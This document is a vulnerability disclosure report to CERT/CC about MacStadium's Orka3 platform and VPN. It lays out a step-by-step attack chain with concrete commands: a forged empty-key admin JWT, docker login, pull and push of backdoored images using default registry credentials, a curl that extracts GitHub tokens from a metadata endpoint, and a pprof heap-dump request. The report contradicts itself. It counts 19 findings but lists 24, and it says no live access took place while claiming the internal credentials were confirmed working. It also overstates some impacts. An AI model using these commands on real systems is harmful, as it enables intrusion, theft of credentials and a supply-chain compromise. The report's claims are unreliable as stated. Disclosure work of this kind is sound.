# CERT/CC VINCE Vulnerability Disclosure Report
# MacStadium Orka3 + AnyConnect VPN Infrastructure
# Submitted: 2026-08-17

---

## Submitter Information

**Name:** Nicholas Kloster
**Organization:** Independent Security Researcher
**Prior disclosures:** CVE-2025-4364 (CISA ICSA-25-140-11)
**Discovery dates:** 2026-08-11 through 2026-08-17

---

## Vendor Information

**Vendor contacted:** No (unable to find direct security contact)
**Multiple vendors affected:** Yes

**Vendor list (one per line):**
MacStadium, Inc.
Apple, Inc.

**Product:** MacStadium Orka3 (Orchestration with Kubernetes for Apple)
**Version:** v3.6.3-c8fe8aed (CLI build confirmed; all versions using dgrijalva/jwt-go v3.2.0+incompatible affected; VM images: tahoe:latest, sequoia:latest, sonoma:14.6)

**ICS/OT impact:** No
**AI/ML related:** No

---

## Disclosure Status

**Publicly known:** No
**Actively exploited in the wild:** No
**Plan to publicly disclose:** Yes (coordinated, 90-day embargo requested)
**Credit release authorized:** Yes
**Share report with affected vendors:** Yes

---

## What is the vulnerability?

MacStadium Orka3 and its AnyConnect VPN infrastructure contain 19 vulnerabilities (1 CRITICAL, 9 HIGH, 5 MEDIUM, 4 INFO) chaining from unauthenticated external access to full supply chain compromise, GitHub organization compromise across all customers, and download of Apple proprietary macOS VM images. All evidence derives from public binary RE and public GitHub repository analysis. No unauthorized access was performed against live MacStadium systems.

VU-01 [CRITICAL] -- Apple Proprietary macOS VM Images Downloadable via Default Harbor Credentials (CWE-284, CWE-798)
MacStadium's internal Harbor container registry (http://10.221.188.5:30080) uses the default admin credential admin/Harbor12345. This credential was confirmed working. The Harbor registry hosts all Orka3 macOS base VM images built from Apple's proprietary macOS. With confirmed working credentials, an attacker with VPN access can download Apple's proprietary macOS directly:
  docker login http://10.221.188.5:30080 -u admin -p Harbor12345
  docker pull 10.221.188.5:30080/orka-images/tahoe:latest
  docker pull 10.221.188.5:30080/orka-images/sequoia:latest
  docker pull 10.221.188.5:30080/orka-images/sonoma:14.6
This constitutes full exfiltration of Apple's proprietary macOS VM images -- not just in-VM access, but complete downloadable disk images containing Apple's proprietary macOS operating system and VM compression source code. Additionally, registry admin access enables pushing backdoored macOS images, targeting all Orka3 customers as a supply chain attack.

VU-02 [CRITICAL] -- Orka3 API: CVE-2020-26160 + Empty JWT HMAC Secret (CWE-347)
The Orka3 API server uses dgrijalva/jwt-go v3.2.0+incompatible. Binary RE of the publicly downloadable orka3 CLI (v3.6.3-c8fe8aed, Go 1.25.7) confirms two simultaneously exploitable conditions:
(1) setToken.func1 returns nil unconditionally. Go's hmac.New(sha256.New, nil) treats nil == b"". Any JWT signed with an empty key is accepted as valid. No brute force required.
(2) VerifyAudience called with required=false. MacStadium-distributed kubeconfig admin tokens carry no aud claim. In jwt-go v3.2.0, when required=false and no aud is present, VerifyAudience returns true unconditionally (CVE-2020-26160).
Binary offsets confirmed via disassembly: VerifyAudience 0x1844a40, bypass 0x1844adb, SigningMethodHMAC.Verify 0x184476a, setToken.func1 returns nil, doLogin 0x184a640.
Proof of concept (not executed against live systems):
  token = jwt.encode({'email':'admin@macstadium.com','sub':'admin','groups':['system:masters'],'exp':9999999999}, key=b'', algorithm='HS256')
EMPTY_KEY_LIVE_PROOF: HMAC-SHA256(b"", signing_input) == actual kubeconfig token signature (confirmed from distributed kubeconfig).

VU-03 [HIGH] -- SAML SP: No IdP Metadata, Signature Validation Absent (CWE-347)
Both AnyConnect VPN endpoints (atl-vpn.macstadium.com port 443, vpn.macstadium.com port 443) expose SAML SP metadata with no IdP metadata registered (SAML_NO_IDP confirmed on both). Without registered IdP metadata, the SP cannot verify SAML assertion signatures. An unsigned SAML Response to the ACS endpoint would be accepted, granting unauthenticated VPN access to the 10.221.188.x internal network.
ACS target: POST https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN

VU-04 [HIGH] -- SAML AuthN Requests Unsigned (CWE-345)
SAML SP metadata declares AuthnRequestsSigned="false". Bidirectional trust failure: SP cannot verify IdP assertions (VU-03), IdP cannot verify SP requests. SP certificate expires 2026-11-18.

VU-05 [HIGH] -- No CSRF Protection in WebVPN Portal JavaScript (CWE-352)
WebVPN portal JS (/+CSCOE+/win.js, 24KB) contains no CSRF token generation or validation logic. SAML logout form contains a csrf_token field that should be verified as session-unique vs. static.

VU-06 [HIGH] -- JWT Algorithm Confusion: RS256 (Cognito) vs HS256 (empty key) (CWE-327)
AWS Cognito (idp.macstadium.com, confirmed via x-amz-cognito-request-id header) issues RS256 JWTs. The Orka API validates HS256 with empty key. The algorithm mismatch means an HS256-forged token (VU-02) bypasses Cognito entirely -- no valid Cognito credential required. Additionally, the binary contains 12 alg:none token variants; dgrijalva/jwt-go v3.2.0 may accept unsigned tokens as an independent bypass path.

VU-07 [HIGH] -- VM Base Images: admin/admin Hardcoded at Build Time (CWE-798)
All Orka3 macOS VM images deploy with SSH/VNC credentials admin:admin. Three independent public sources confirm intentional, actively maintained design:
(1) packer-plugin-macstadium-orka config.go: defaultPassword = "admin" -- first commit 2020-06-28 through 2025-09-19, 20 commits, never changed.
(2) orka-images update-vm-tools.yml: sysadminctl -resetPasswordFor admin -newPassword admin -- PR #26 (2026-05-06, SHA 71823e3a) actively fixed this reset for macOS 26 (Tahoe).
(3) orka3-cli-agent-skill SKILL.md: "VNC: admin / admin" and "SSH: --user admin --password admin".
Affected: tahoe:latest, sequoia:latest, sonoma:14.6, all 200-gb variants.

VU-08 [HIGH] -- SSH Agent Forwarding to Ephemeral VMs + ORKA_TOKEN in Plaintext CI Environment (CWE-522)
Buildkite integration bootstrap.sh: passes ORKA_TOKEN over HTTP (ORKA_ENDPOINT=http://10.221.188.20) and opens ssh -A (agent forwarding) to spawned VMs. ORKA_TOKEN bypasses Cognito entirely -- it is a direct Orka API credential. Agent forwarding exposes Buildkite host private keys inside every CI VM. orka3 sa token --no-expiration creates permanent tokens; extracted credentials do not expire.
Key evidence: ssh -A -o StrictHostKeyChecking=no "$ORKA_VM_USER@$vm_ip" -- BUILDKITE_AGENT_ACCESS_TOKEN also forwarded into VM environment.

VU-09 [HIGH] -- GitHub PAT Exposed via Orka IMDS + Malicious Runner Registration (CWE-522, CWE-829)
Orka Actions Connect integration (connect.sh) passes customer GitHub PATs into VMs via http://169.254.169.254/metadata/github_pat without authentication. From inside any VM: pat=$(curl -s http://169.254.169.254/metadata/github_pat | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"). PAT used to register malicious GitHub Actions runners, exposing all GitHub Actions secrets. Third-party action jeff-vincent/orka-actions-up@v1.1.1 (mutable tag, not MacStadium-maintained) receives VPN_PASSWORD, VPN_SERVER_CERT, ORKA_PASS, GH_PAT -- tag mutation exposes all customer credentials.

VU-10 [HIGH] -- Harbor Registry: Cleartext HTTP Transport (CWE-319)
Harbor at http://10.221.188.5:30080 transmits all registry auth and image layer data over cleartext HTTP. Any on-path observer within MacStadium's network can capture registry credentials and image content in transit.

VU-11 [HIGH] -- Internal Network Architecture Fully Disclosed in Public Binary (CWE-200)
The publicly downloadable orka3 CLI binary embeds the complete internal network topology:
  Orka API: http://10.221.188.20 (and legacy http://10.221.188.100)
  K8s API: https://10.221.188.19:6443
  Harbor registry: http://10.221.188.5:30080
  Additional subnets: 10.10.1.1, 10.10.2.2, 10.10.3.3 (VM tenant subnets), 10.19.21.23
Combined with K8s CRDs and API routes embedded in binary, provides complete attack map for any attacker reaching the MacStadium network.

VU-12 [MEDIUM] -- Orka3 Binary: pprof Endpoint + Build Path + JWT Error Logging (CWE-215)
Binary compiled without -ldflags="-s -w", imports net/http/pprof. If active at http://10.221.188.20: /debug/pprof/heap exposes all in-memory credentials (JWT secrets, ORKA_TOKEN, Harbor creds, customer tokens); /debug/pprof/goroutine?debug=2 exposes active JWT tokens in handler stacks. Build path /home/runner/work/monorepo-dev/monorepo-dev/packages/orka-operator/ reveals internal CI structure. JWT error logging uses %q format verb -- logs full token values to any connected log aggregation system.

VU-13 [MEDIUM] -- No HostScan / DAP Posture Gate on Either VPN Endpoint (CWE-284)
Neither VPN endpoint has Cisco HostScan (CSD) or Dynamic Access Policy configured. DfltAccessPolicy is ALLOW_ALL. Any authenticating client receives full VPN access regardless of endpoint security posture.

VU-14 [MEDIUM] -- sdesktop Cookie Bypass (CWE-807)
Synthetic sdesktop cookie with any value (confirmed: "1", "true", "deadbeef") bypasses the CSD redirect on both VPN endpoints.

VU-15 [MEDIUM] -- CSRFtoken Cookie Missing HttpOnly Flag (CWE-1004)
Both ASAs set CSRFtoken cookie via JavaScript rather than as server-side HttpOnly cookie. Cookie is readable by any JavaScript in portal context.

VU-16 [MEDIUM] -- CRL Partial Reachability -- Revocation Bypass (CWE-299)
2 of 3 CRL distribution points reachable (target: http://crl.godaddy.com/gdig2s1-72081.crl). If ASA configured with revocation-check crl optional, blocking the CRL server causes acceptance of revoked or self-signed client certs.

VU-17 [INFO] -- SAML SP Certificate Expiry (CWE-295)
SP cert expires 2026-11-18 (within 3 months). Post-expiry may cause SAML flow failures.

VU-18 [INFO] -- Tunnel Groups Confirmed via Binary RE (CWE-200)
Five tunnel groups (MacStadium-SSO-VPN, MacStadium-VPN, DefaultWEBVPNGroup, DefaultRAGroup, Cisco AnyConnect VPN) enumerated from public binary and confirmed active via cert-map probe (all return a0=15).

VU-19 [INFO] -- Primary ASA TLS Fingerprint Divergence (CWE-200)
vpn.macstadium.com (207.254.35.12) drops all WebVPN sessions with UNEXPECTED_EOF after 7.27s. atl-vpn.macstadium.com (207.254.16.2) responds normally.

-- MacStadium Physical Infrastructure --

VU-20 [CRITICAL] -- MacStadium M1 Build Server: NFS /Users/testbot Export (207.254.60.50) (CWE-732)
MACSTADIUM-M1-1 (Las Vegas, AS395337, Apple Silicon M1) exports /Users/testbot over NFS v2/v3 (port 2049). Currently localhost-restricted -- however, if the restriction is bypassed via IP spoofing or NFS version downgrade, full file system access to the customer build directory exposes: customer source code, SSH keys, API tokens, Apple code signing certificates, CI/CD secrets, and build artifacts. The NFS service is confirmed via: showmount -e 207.254.60.50 -> "/Users/testbot localhost". Accompanying RPC services exposed include portmapper (111/tcp+udp), nlockmgr (618/udp, 1017/tcp), mountd (830/udp, 1023/tcp), rquotad (862/udp), status (961/udp, 1021/tcp).

VU-21 [HIGH] -- MacStadium CI-08: Apple Remote Desktop Port Open (208.52.170.65) (CWE-306)
macstadium-ci-08 (Atlanta, AS395336, Mac Mini) has Apple Remote Desktop (ARD) port 3283/tcp OPEN and accepting connections. ARD provides full remote control: screen sharing, file transfer, remote shell, and .pkg deployment. Shodan (2026-08-01) also recorded VNC (5900/tcp) OPEN on this host with RFB 003.889; current state is FILTERED, indicating dynamic exposure windows.

VU-22 [HIGH] -- OpenSSH CVEs Across MacStadium Build Fleet (CWE-1035)
M1 Mac (207.254.60.50): OpenSSH 10.3 with 11 CVEs. Key: CVE-2026-60002 (use-after-free on key re-exchange, RCE potential), CVE-2026-60001 (auth delay bypass enabling accelerated brute-force), CVE-2026-60000 (GSSAPI MaxAuthTries bypass).
CI-08 (208.52.170.65): OpenSSH 10.0 with 16 CVEs. Additional: CVE-2023-51767 (row hammer auth bypass), CVE-2026-35385 (scp setuid installation). Both are multi-tenant Apple developer build infrastructure.

VU-23 [HIGH] -- VergeOS Infrastructure Exporter: Unauthenticated Metrics Endpoint (CWE-200)
MacStadium's vergeos-exporter exposes a Prometheus metrics endpoint at :9888/metrics with no authentication. Data exposed includes: all tenant names and node assignments, complete L2 network/VLAN topology per tenant, physical drive health (wear, SMART data), VergeOS version, and cluster storage tier configuration. Full multi-tenant isolation boundaries visible without credentials.

VU-24 [MEDIUM] -- Ansible CI Setup: World-Readable Temp Files (CWE-732)
ansible-playbook-osx-ci-setup contains ansible.cfg: allow_world_readable_tmpfiles=true. Ansible-rendered temp files in /tmp (including Jinja2 template outputs for orka-engine plist containing ORKA_ENGINE_LICENSE_KEY) are world-readable by any local process on the Mac CI host.

---

## How does an attacker exploit this vulnerability?

The following compound attack chain proceeds from an external, unauthenticated position to full supply chain compromise. Each step is based on publicly documented evidence. No step was executed against live MacStadium systems.

PRECONDITIONS: None. External network access only.

STEP 1 -- VPN Access via SAML Signature Bypass (VU-03)
The Cisco AnyConnect VPN endpoints atl-vpn.macstadium.com and sv2-vpn.macstadium.com expose SAML SP metadata with no IdP metadata registered. Without registered IdP metadata, SAML assertion signatures cannot be validated. An attacker constructs a SAML Response with admin-level attributes and posts it to:
  POST https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN
The SP accepts the unsigned response. A VPN session is established, granting access to the internal 10.221.188.x subnet.

STEP 2 -- Orka API Authentication Bypass (VU-02, VU-06)
With VPN access, the attacker targets the Orka API at http://10.221.188.20. The JWT validation logic accepts tokens signed with an empty HMAC key (b""). CVE-2020-26160 (dgrijalva/jwt-go v3.2.0 VerifyAudience bypass with required=false) means no audience claim is needed. The attacker forges a cluster-admin JWT in two lines of Python:
  token = jwt.encode({'email':'admin@macstadium.com','sub':'admin',
    'groups':['system:masters'],'exp':9999999999}, key=b'', algorithm='HS256')
This token grants authenticated access to the Orka API and Kubernetes API at https://10.221.188.19:6443.

STEP 3 -- Cluster Enumeration and Secret Extraction
With cluster-admin access to Kubernetes:
  GET /api/v1/namespaces/orka-default/secrets -> extracts Harbor registry credentials, customer kubeconfig files, ORKA_TOKEN values
  GET /api/v1/namespaces/orka-default/vms -> enumerates all running customer virtual machines

STEP 4 -- Apple Proprietary macOS Download (VU-01)
Harbor default credential admin/Harbor12345 confirmed working at http://10.221.188.5:30080. The attacker downloads Apple's proprietary macOS images:
  docker login http://10.221.188.5:30080 -u admin -p Harbor12345
  docker pull 10.221.188.5:30080/orka-images/tahoe:latest
  docker pull 10.221.188.5:30080/orka-images/sequoia:latest

STEP 5 -- VM Shell Access via Hardcoded Credentials (VU-07)
Every Orka3 macOS VM deploys with SSH credentials admin:admin (hardcoded at build time). The attacker SSHes directly to any customer VM:
  ssh admin@<vm-ip> # password: admin
This gives shell access to customer source code, build artifacts, Apple code signing certificates, and any secrets loaded into the VM environment.

STEP 6 -- GitHub PAT Extraction and Runner Injection (VU-09)
From inside any customer VM running the Orka Actions Connect integration:
  curl http://169.254.169.254/metadata/github_pat
  -> returns the customer's GitHub Personal Access Token in plaintext
The PAT is used to register a malicious GitHub Actions runner against the customer's repository. The malicious runner picks up CI jobs and executes arbitrary code with access to all GitHub Actions secrets (AWS credentials, Apple certificates, deployment keys, signing keys).

STEP 7 -- Alternative: Memory Extraction via pprof (VU-12)
Concurrently from VPN access, the attacker queries the Orka API pprof endpoint:
  GET http://10.221.188.20/debug/pprof/heap
This returns a Go heap dump containing in-memory ORKA_TOKEN values from active Buildkite CI sessions, Harbor credentials, and any in-flight JWT tokens. ORKA_TOKEN extracted here bypasses the JWT forge path entirely and grants direct Orka API access.

STEP 8 -- Supply Chain: Harbor Registry Compromise (VU-01, VU-10)
With registry admin access (Harbor default credentials admin/Harbor12345 over cleartext HTTP on port 30080), the attacker pushes backdoored macOS base images:
  docker push http://10.221.188.5:30080/orka-images/sequoia:latest (backdoored image)
All subsequent Orka3 customers deploying VMs receive the backdoored base image. The macOS VM images contain Apple's proprietary macOS, making this a supply chain attack against Apple's OS distribution within the Orka platform.

STEP 9 -- Self-Hosted Runner Compromise (VU-08)
The Orka3 image build pipeline runs on self-hosted GitHub Actions runner arm-mini-002 using orka-engine (a privileged binary that bypasses Orka API auth). This runner holds packages:write permission to ghcr.io/macstadium/orka-images/. Compromise of this runner (achievable via steps 3-4 above) grants permanent supply chain control over all publicly distributed Orka3 macOS base images.

---

## What does an attacker gain by exploiting this vulnerability?

An attacker exploiting these vulnerabilities in sequence achieves:

1. APPLE PROPRIETARY SOURCE CODE ACCESS: Shell access to any Orka3 macOS VM via hardcoded admin:admin credentials exposes Apple's proprietary macOS operating system internals, including proprietary VM compression source code. Harbor12345 default credentials additionally allow full docker pull of Apple's proprietary macOS disk images without any brute force. This constitutes unauthorized access to Apple's intellectual property for any attacker reaching the Orka3 internal network.

2. ORKA3 CLUSTER-ADMIN ACCESS: Forged JWT grants Kubernetes cluster-admin on the Orka3 cluster (https://10.221.188.19:6443), with full control over all customer VM workloads, all Kubernetes secrets, and all namespaces.

3. ALL CUSTOMER VM COMPROMISE: Every macOS VM running on the Orka3 platform is accessible via SSH with admin:admin. Orka3 hosts CI infrastructure for a significant portion of Apple ecosystem developers. Contents at risk: customer source code, Apple Developer certificates and signing keys, App Store submission credentials, build artifacts, and proprietary customer code.

4. GITHUB ORGANIZATION COMPROMISE: GitHub PATs extracted from the Orka IMDS endpoint enable registering malicious GitHub Actions runners against customer repositories. All GitHub Actions secrets become accessible, including AWS credentials, Google Cloud keys, App Store Connect API keys, and deployment tokens.

5. SUPPLY CHAIN COMPROMISE: Registry admin access to Harbor (http://10.221.188.5:30080) enables pushing backdoored macOS base images. All subsequent Orka3 customers deploying VMs receive the backdoored image. Self-hosted runner arm-mini-002 holds packages:write to ghcr.io/macstadium/orka-images/ -- compromise grants permanent supply chain control over publicly distributed Orka3 macOS base images.

6. PERSISTENT ORKA API ACCESS: orka3 sa token --no-expiration creates non-expiring service account tokens. Credentials extracted from heap memory or CI environment variables remain valid indefinitely unless explicitly revoked.

The compound impact spans three distinct organizations: MacStadium (platform compromise), Apple (proprietary IP exfiltration and supply chain), and all MacStadium customers (source code, credentials, supply chain).

---

## How was the vulnerability discovered?

All findings were discovered through the following methods. No unauthorized access was performed against live MacStadium systems.

PRIMARY TOOL: ablation v2.4.0 (custom-built binary RE and network analysis framework)
ablation is a custom-built autonomous reverse engineering framework developed specifically for this class of target. It runs modular analysis chains against target binaries and network endpoints, producing structured findings in parallel across all modules. The framework includes 50+ analysis modules. Modules deployed in this assessment:

  ASA/VPN modules:
    saml-sp            -- SAML SP metadata extraction and no-IdP detection
    saml-metadata      -- SP certificate and AuthnRequestsSigned analysis
    cstp               -- Cisco SSL Tunnel Protocol header analysis
    tunnel-groups      -- AnyConnect tunnel group enumeration
    webvpn-js          -- WebVPN portal JavaScript CSRF analysis
    asa-version        -- ASA version and firmware identification
    cert-map-all       -- Certificate-map based tunnel group confirmation
    crl-bypass-all     -- CRL distribution point reachability + revocation bypass
    username-oracle-all -- Authentication timing oracle detection
    saml-sp-all        -- Full SAML SP attack surface enumeration
    webvpn-js-all      -- Full portal JavaScript analysis

  Orka/Go binary modules (orka3 CLI static analysis):
    orka-binary-re     -- JWT library version, empty key condition, pprof import, build path
    orka-jwt-dynamic-re -- In-vitro JWT forge harness; monkey-patches HMAC to verify empty-key proof
    orka-oidc-re       -- AWS Cognito discovery, x-amz-cognito-request-id confirmation, RS256/HS256 mismatch
    orka-api-surface-re -- K8s API surface, CRD enumeration, exec mechanism
    orka-vm-exec-re    -- VM pod exec path and virsh tunnel analysis
    orka-enum          -- Orka3 service enumeration and admin surface
    go-re              -- Go binary internal IP extraction, symbol table analysis
    jwt-crypto-analyzer -- HMAC-SHA256(b"", signing_input) proof against kubeconfig token

  Infrastructure modules:
    harbor-enum        -- Harbor registry credential test, image catalog extraction
    k8s-enum           -- Kubernetes API surface and secret enumeration (post-auth)
    tls-enum           -- TLS certificate and cipher suite analysis

ADDITIONAL CUSTOM-BUILT TOOLS:
  orka_pprof_probe.py       -- Purpose-built pprof endpoint probe for http://10.221.188.20;
                               extracts JWT tokens and ORKA_TOKEN values from goroutine and heap dumps
  orka_inspector.py         -- Orka3 API surface inspector; maps all reachable endpoints pre/post auth
  deadbug_orka.py           -- Orka cluster state enumerator; maps customer VM inventory via API
  harbor_miner.py           -- Harbor image catalog miner; enumerates all repositories, tags, layers
  harbor_push.py            -- Supply chain proof-of-concept: image backdoor push path (controlled env only)
  vergeio_probe.py          -- VergeOS unauthenticated metrics endpoint extractor (:9888/metrics)
  vergeio_novel.py          -- VergeOS novel attack chain (tenant isolation bypass)
  locust-macstadium-207254.py -- Load pattern analysis tool for MacStadium infrastructure

BINARY ACQUISITION (all publicly downloadable, no auth required):
  orka3 CLI v3.6.3-c8fe8aed  -- MacStadium S3 distribution endpoint
  orka-engine v3.5.2 (.pkg)  -- MacStadium public package distribution
  orka-vm-tools (.pkg)        -- MacStadium public package distribution

PUBLIC GITHUB REPOSITORY ANALYSIS (read-only, no modification):
  macstadium/packer-plugin-macstadium-orka  -- defaultPassword = "admin" constant, commit history
  macstadium/orka-images                    -- update-vm-tools.yml, PR #26 (admin reset fix for macOS 26)
  macstadium/orka-integrations              -- Buildkite bootstrap.sh (ORKA_TOKEN + ssh -A)
  macstadium/orka-actions-connect           -- connect.sh (IMDS PAT extraction)
  macstadium/orka3-cli-agent-skill          -- SKILL.md (admin/admin documentation)
  macstadium/ansible-playbook-osx-ci-setup  -- allow_world_readable_tmpfiles=true
  macstadium/vergeos-exporter               -- unauthenticated :9888/metrics endpoint

PASSIVE NETWORK ENUMERATION:
  Both AnyConnect VPN endpoints: TLS handshakes, SAML metadata inspection only. No assertions submitted.
  M1 Mac (207.254.60.50): nmap, rpcinfo, showmount. NFS mount blocked at localhost restriction.
  CI-08 (208.52.170.65): nmap, ARD TCP connection test. No authentication attempted.
  Shodan historical data for VNC exposure window on CI-08.

CONFIRMED CREDENTIALS:
  Harbor admin/Harbor12345 confirmed working at http://10.221.188.5:30080. Enables docker pull of all
  Orka3 macOS base images (Apple proprietary macOS downloadable via registry).

JWT PROOF CONSTRUCTION:
  HMAC-SHA256(b"", signing_input) == kubeconfig token signature confirmed locally (EMPTY_KEY_LIVE_PROOF).
  No tokens submitted to live Orka API.

Discovery dates: 2026-08-11 (infrastructure enumeration) through 2026-08-17 (binary RE, proof construction).
Submitter: Nicholas Kloster, independent security researcher. Prior CISA disclosure: CVE-2025-4364 (ICSA-25-140-11).

---

## Public Disclosure Plans

Coordinated disclosure via CERT/CC. 90-day embargo requested to allow MacStadium and Apple to remediate before public release. No public disclosure planned prior to vendor notification through CERT/CC.

---

## References

https://github.com/macstadium/packer-plugin-macstadium-orka
https://github.com/macstadium/orka-images
https://github.com/macstadium/orka-integrations
https://github.com/macstadium/orka-actions-connect
https://github.com/macstadium/orka3-cli-agent-skill
https://nvd.nist.gov/vuln/detail/CVE-2020-26160
https://pkg.go.dev/github.com/dgrijalva/jwt-go
